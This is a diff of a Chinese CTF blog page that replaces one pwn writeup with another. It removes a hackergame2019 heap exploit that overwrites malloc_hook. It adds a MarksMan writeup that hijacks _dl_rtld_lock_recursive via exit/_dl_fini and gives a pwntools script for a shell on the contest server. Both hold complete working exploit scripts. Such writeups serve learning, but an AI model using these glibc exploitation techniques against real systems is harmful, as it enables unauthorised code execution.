@@ -3,7 +3,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>hackergame2019 没有bug的教务系统 Writeup - 广莫之野</title>
+  <title>数字中国创新大赛虎符网络安全赛道pwn MarksMan writeup - 广莫之野</title>
   <meta charset="UTF-8">
   <meta name="description" content>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -11,23 +11,18 @@
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta name="description" content="中科大hackergame2019里 没有bug的教务系统 的writeup">
+  <meta name="description" content="学习了通过修改_dl_fini中的一处函数指针来劫持程序流的利用方式">
 <meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hackergame2019 没有bug的教务系统 Writeup">
-<meta property="og:url" content="http://shiroinu.top/2019/11/02/hackergame2019-easyCPP-wp/index.html">
+<meta property="og:title" content="数字中国创新大赛虎符网络安全赛道pwn MarksMan writeup">
+<meta property="og:url" content="http://shiroinu.top/2020/04/19/hfb-writeup/index.html">
 <meta property="og:site_name" content="广莫之野">
-<meta property="og:description" content="中科大hackergame2019里 没有bug的教务系统 的writeup">
+<meta property="og:description" content="学习了通过修改_dl_fini中的一处函数指针来劫持程序流的利用方式">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png">
-<meta property="og:image" content="https://i.loli.net/2019/11/02/BXERUAtxlVcLGH7.png">
-<meta property="og:image" content="https://i.loli.net/2019/11/02/2pTde9CLxwOEmAy.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/11/02/3REaMuLSAfpOz57.jpg">
-<meta property="og:updated_time" content="2019-12-05T14:00:34.270Z">
+<meta property="og:updated_time" content="2020-04-19T10:12:44.409Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hackergame2019 没有bug的教务系统 Writeup">
-<meta name="twitter:description" content="中科大hackergame2019里 没有bug的教务系统 的writeup">
-<meta name="twitter:image" content="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png">
+<meta name="twitter:title" content="数字中国创新大赛虎符网络安全赛道pwn MarksMan writeup">
+<meta name="twitter:description" content="学习了通过修改_dl_fini中的一处函数指针来劫持程序流的利用方式">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
@@ -35,7 +30,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1587291221660">
+  <link rel="stylesheet" href="/css/style.css?v=1587291221886">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -136,100 +131,106 @@
         
             <img src="/images/back1.png">
         
-        <h1>hackergame2019 没有bug的教务系统 Writeup</h1>
+        <h1>数字中国创新大赛虎符网络安全赛道pwn MarksMan writeup</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月02日</a>
-    <a><i class="nexmoefont icon-areachart"></i>810 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年04月19日</a>
+    <a><i class="nexmoefont icon-areachart"></i>572 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
     
     
       <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
     
   </div>
   <article>
-    <p>中科大hackergame2019里 没有bug的教务系统 的writeup</p>
+    <p>学习了通过修改<code>_dl_fini</code>中的一处函数指针来劫持程序流的利用方式</p>
 <a id="more"></a>
-<p>先引用一下官方的wp</p>
-<blockquote>
-<p><a href="https://github.com/ustclug/hackergame2019-writeups/tree/master/official/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">官方writeup</a></p>
-</blockquote>
-<h1 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h1><p>即利用edit info中 v5的任意地址free</p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>核心就在于editInfo()以及setPassword()<br><img src="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png" alt="setPassword"><br><img src="https://i.loli.net/2019/11/02/BXERUAtxlVcLGH7.png" alt="editInfo"><br>setPassword()中的s[]距editInfo()中v5的偏移为0x80<br><img src="https://i.loli.net/2019/11/02/2pTde9CLxwOEmAy.jpg" alt="setPassword"></p>
-<p><img src="https://i.loli.net/2019/11/02/3REaMuLSAfpOz57.jpg" alt="editInfo"></p>
-<blockquote>
-<p>偏移量 = 0x7ffd3a074ba0 - 0xB0 - 0x7ffd3a074ba0 + 0x30  = - 0x80</p>
-</blockquote>
-<p>具体过程见EXP的注释 </p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="python">#encoding:utf-8
-from pwn import *
-password = &#39;\x44\x00\x02\x41\x43\x47\x10\x63\x00&#39;
-one_gadget_offset = 0xf02a4
-pswd_addr = 0x6032E0
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目一开始给出了libc地址,并且允许任意地址写三字节。但是有<code>check()</code>函数会过滤掉三个<code>one_gadget</code>。</p>
+<pre><code class="c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  signed int i; // [rsp+8h] [rbp-28h]
+  signed int j; // [rsp+Ch] [rbp-24h]
+  __int64 v6; // [rsp+10h] [rbp-20h]
+  char v7[3]; // [rsp+25h] [rbp-Bh]
+  unsigned __int64 v8; // [rsp+28h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  setvbufs();
+  welcome();
+  puts(&quot;Free shooting games! Three bullets available!&quot;);
+  printf(&quot;I placed the target near: %p\n&quot;, &amp;puts);
+  puts(&quot;shoot!shoot!&quot;);
+  v6 = readl();
+  for ( i = 0; i &lt;= 2; ++i )
+  {
+    puts(&quot;biang!&quot;);
+    read(0, &amp;v7[i], 1uLL);
+    getchar();
+  }
+  if ( (unsigned int)check(v7) )
+  {
+    for ( j = 0; j &lt;= 2; ++j )
+      *(_BYTE *)(j + v6) = v7[j];
+  }
+  if ( !dlopen(0LL, 1) )                        // dlopen(NULL,RTLD_LAZY)
+    exit(1);
+  puts(&quot;bye~&quot;);
+  return 0LL;
+}
+
+signed __int64 __fastcall check(_BYTE *a1)
+{
+  if ( (*a1 != 0xC5u || a1[1] != 0xF2u) &amp;&amp; (*a1 != 0x22 || a1[1] != 0xF3u) &amp;&amp; *a1 != 0x8Cu &amp;&amp; a1[1] != 0xA3u )
+    return 1LL;
+  puts(&quot;You always want a Gold Finger!&quot;);
+  return 0LL;
+}</code></pre>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>通过修改<code>_rtld_global</code>结构体中的<code>_dl_rtld_lock_recursive</code>指针的值为<code>one_gadget</code>来获取shell.<br>漏洞的原理是在调用<code>exit()</code>函数时有<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code>这样一条调用链，且<code>__rtld_lock_unlock_recursive</code>指针可读写，因此可以利用。<br>可以通过在gdb中<code>p &amp;_rtld_global._dl_rtld_lock_recursive</code>来获取偏移。</p>
+<pre><code class="c">pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive
+$2 = (void (**)(void *)) 0x7ffff7ffdf60 &lt;_rtld_global+3840&gt;</code></pre>
+<p>在这题中,因为过滤掉了三个<code>one_gadget</code>,因此选择将<code>one_gadget</code>前移一条指令,即改为<code>0x10a387</code>,就可以成功get shell了。</p>
+<pre><code class="bash">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  rcx == NULL
+
+0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL</code></pre>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
 context.log_level = &#39;DEBUG&#39;
-elf =ELF(&#39;./EasyCPP&#39;)
-pswd = map(lambda x:ord(x) , list(password))
-ans = &#39;&#39;
-#sh = process(&#39;./EasyCPP&#39;)
-for i in reversed(range(8)):
-    for x in range(256):
-        if(pswd[i] == (((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) | i) &amp; ~((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) &amp; i))):
-            pswd[i] = x
-            break
-ans = &#39;&#39;.join(map(lambda x : chr(x) , pswd) )
-def edit(ps , stu):
-    sh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)
-    sh.sendafter(&#39;Your new password:&#39;,ps)
-    sh.sendafter(&#39;please:&#39;,stu)
-    sh.sendlineafter(&#39;grade(0~100):&#39;,&#39;0&#39;)
-    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)
-    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)
-    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)
-sh = process(&#39;./EasyCPP&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]
+#sh = process(&quot;./chall&quot;, env = {&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;})
+#  sh = process(&#39;./chall&#39;)
+sh = remote(&#39;39.97.210.182&#39;, 10055)
+sh.recvuntil(&#39;near: &#39;)
+libc_base = int(sh.recvuntil(&#39;\n&#39;)[:-1],16) - 0x809c0
+log.info(&quot;libc_base = &quot;+hex(libc_base))
+one_gadget = libc_base + 0x10a387
+dl_rtld_lock_recursive = libc_base + 0x81DF60
+log.info(&quot;target = &quot; + hex(dl_rtld_lock_recursive))
+log.info(&#39;one_gadget = &#39;+hex(one_gadget))
 #gdb.attach(sh)
-sh.recvuntil(&#39;Username:&#39;)
-sh.sendline(&#39;admin&#39;)
-sh.recvuntil(&#39;Password:&#39;)
-sh.send(ans)
-payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)
-payload += p64(0)
-edit(payload,&#39;a&#39; * 0x20)
-# 第一次循环是为了将v4 free 置入fastbin中,因此fake chunk其实不必构造
-# v4是malloc(0x0B) 即 len(&#39;PB19000001&#39;) + 1 实际size = 0x21
-payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)
-payload += p64(pswd_addr + 0x10)
-edit(payload,&#39;a&#39;)
-# 第二次循环 构造size = 0x21的fake_chunk 使得在T-&gt;edit中malloc(1) 得到最小chunk
-# free(fake_chunk) 再在 T-&gt;edit 中将其malloc出来，且仅修改最低一字节为0x61
-sh.recvuntil(&#39;STUDENT: &#39;)
-heap_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))
-log.info(&#39;heap_addr = &#39; + hex(heap_addr))
-# 泄露heap地址 偏移固定
-payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)
-payload += p64(heap_addr - 0x41)
-edit(payload ,p64(elf.got[&#39;setvbuf&#39;]))
-sh.recvuntil(&#39;STUDENT: &#39;)
-# 第三次循环 heap_addr - 0x41 = 程序开始时malloc(0x18)的T所在chunk ,fd 即为studentNum
-# 先将其free再在T-&gt;edit 中将其malloc出来 修改studentNum为got表地址 即可获得libc地址 libc题目已给出 偏移量已知
-libc_setvbuf_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))
-libc_base = libc_setvbuf_addr - 0x6fe70
-log.info(&#39;libc_base_addr =&#39; + hex(libc_base))
-one_gadget = libc_base + one_gadget_offset
-find_fake_fast_offset = 0x23
-malloc_hook_offset = 0x3C4B10
-payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(pswd_addr + 0x10) + p64(0)*2 #+ &#39;\x21&#39;
-edit(payload,&#39;a&#39; * 0x30)
-# 第四次循环, 构造fake_chunk size = 0x71 用于寻找find_fake_fast
-# 这次循环 仅为了将bss段上的pswd地址free进fastbin链中 fd会被置0
-payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;
-edit(payload,&#39;\x00&#39; * 0x60)
-# 第五次循环 UAF 修改刚刚被free的fake chunk 的fd = fake_fast 然后将其malloc 此时已不必利用free(v5) 因此是p64(0)
-payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;
-edit(payload,&#39;a&#39; * 0x13 + p64(one_gadget) + &#39;\x00&#39; * 69)
-# 最后一次循环 malloc fake_fast a*0x13 是算上了 find_fake_fast的chunk头0x10 修改malloc_hook 为one_gadget
-sh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)
-sh.sendline(&#39;1234&#39;)
+sh.recvuntil(&#39;shoot!shoot!\n&#39;)
+sh.sendline(str(dl_rtld_lock_recursive))
+sh.recvuntil(&#39;biang!\n&#39;)
+sleep(0.1)
+sh.sendline(p8(one_gadget &amp; 0xFF))
+sh.recvuntil(&#39;biang!\n&#39;)
+sleep(0.1)
+sh.sendline(p8((one_gadget &gt;&gt; 8) &amp; 0xFF))
+sh.recvuntil(&#39;biang!\n&#39;)
+sleep(0.1)
+sh.sendline(p8((one_gadget &gt;&gt; 16) &amp; 0xFF))
+
+
 sh.interactive()</code></pre>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
+<p><a href="http://www.starssgo.top/2020/04/13/exit-hook%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">http://www.starssgo.top/2020/04/13/exit-hook%E6%94%BB%E5%87%BB/</a></p>
+</blockquote>
 
   </article>
   
@@ -268,7 +269,7 @@ sh.interactive()</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1587291221666"></script>
+<script src="/js/app.js?v=1587291221891"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
